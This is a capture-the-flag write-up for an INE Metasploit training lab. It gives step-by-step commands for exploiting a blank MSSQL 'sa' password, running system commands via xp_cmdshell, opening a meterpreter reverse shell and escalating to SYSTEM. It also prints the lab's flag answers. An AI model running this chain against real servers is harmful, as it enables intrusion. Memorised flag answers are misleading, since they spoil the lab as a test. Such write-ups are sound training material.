---
layout: post
title: "The Metasploit Framework CTF 1 Write-up"
date: 2026-08-17
link: https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student
link_text: "INE eJPT Course"
categories: ctf-writeups
---
# Lab Environment

In this lab environment, you will have GUI access to a Kali machine. The target machine will be accessible at **target.ine.local**.

**Objective:** Use Metasploit and manual investigation techniques to capture the following flags:

- **Flag 1:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
- **Flag 2:** Locate the second flag within the Windows configuration folder.
- **Flag 3:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
- **Flag 4:** Investigate the Administrator directory to find the fourth flag.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- mssql

---
### Note

In this lab, the flag will follow the format: FLAG1_MD5Hash. For example, FLAG1_0f4d0db3668dd58cabb9eb409657eaa8. You need to submit only the MD5 hash string, excluding the underscore (_). For instance: 0f4d0db3668dd58cabb9eb409657eaa8.

---
# Task 1

**Clue:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.

The first step is to run an Nmap scan.

`nmap -sS -A -p- -T4 target.ine.local`
- `-sS`: runs a TCP SYN scan
- `-A`: enables OS detection, version detection, script scanning, and traceroute
- `-p-`: sets the port range from 1-65535
- `-T4`: sets the aggressiveness of the scan to a 4 out of 5

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/nmap_mssql.png)
*Figure 1: The MSSQLSERVER portion of the Nmap scan*

The Nmap scan provides many results. For this task, focus on the **MSSQLSERVER** on **port 1433**. 

Search **msfconsole** for auxiliary modules that are related to **mssql** with `search type:auxiliary name:mssql`.

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/mssql_module_search.png)
*Figure 2: MSF console search for MSSQL modules*

The `auxiliary/scanner/mssql/mssql_login` module will be useful. Select it with `use 1` and `set RHOSTS target.ine.local`. Then, `run` the module.

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/mssql_blank_login.png)
*Figure 3: Blank login for user sa*

The `sa` (system administrator) user does not have a password set. That means `impacket-mssqlclient` can be used to login.

`impacket-mssqlclient sa@target.ine.local -no-pass`

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/mssql_login.png)
*Figure 4: MSSQL login with impacket-mssqlclient*

To access the Windows filesystem, use `xp_cmdshell "dir C:\"`

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/flag1_file.png)
*Figure 5: Flag 1 file in the C drive*

Finally, get the flag with `xp_cmdshell "type C:\flag1.txt"`

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/flag1.png)
*Figure 6: Flag 1*

The first flag is `8cba6e5a7ca346f7a322c2982b35f3d9`.

---
# Task 2

**Clue:** Locate the second flag within the Windows configuration folder.

The current user does not have access to the `C:\Windows\System32\config` folder. This flag requires a reverse shell for privilege escalation. Use the `windows/mssql/mssql_clr_payload` module in **msfconsole**. Set the payload to `windows/x64/meterpreter/reverse_tcp` and `run` it.

Once the **meterpreter** session spawns, run `getprivs` to see what privileges the current user has.

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/imp_privs.png)
*Figure 7: Finding SeImpersonatePrivilege*

Since `SeImpersonatePrivilege` is present, use `getsystem` to escalate. Then, view the flag in `C:\Windows\System32\config`.

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/flag2.png)
*Figure 8: Flag 2*

Flag 2 is `094a7de487824505b8e991ca26d3376d`. Save this session for the final task of this CTF.

---
# Task 3

**Clue:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.

Recursively search **System32** to find the file that contains this flag with `xp_cmdshell "dir /s /b C:\Windows\System32\*flag*"`.

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/flag3_search.png)
*Figure 9: Finding the file location of flag 3*

The `sa` account will already have the appropriate privilege for this file. Get the flag with `xp_cmdshell "type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt"`.

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/flag3.png)
*Figure 10: Flag 3*

Flag 3 is `f0888dfca115492d89a6adc37f2c1153`.

---
# Task 4

**Clue:** Investigate the Administrator directory to find the fourth flag.

This task also requires the escalated privileges used in task 2. Use that same session to print the fourth flag at `C:\Users\Administrator\Desktop\flag4.txt`.

![](/assets/writeup_assets/the_metasploit_framework_ctf_1_writeup/flag4.png)
*Figure 11: Flag 4*

The fourth flag is `0e2ae1b7012f463a954a3df1bcdfe504`.
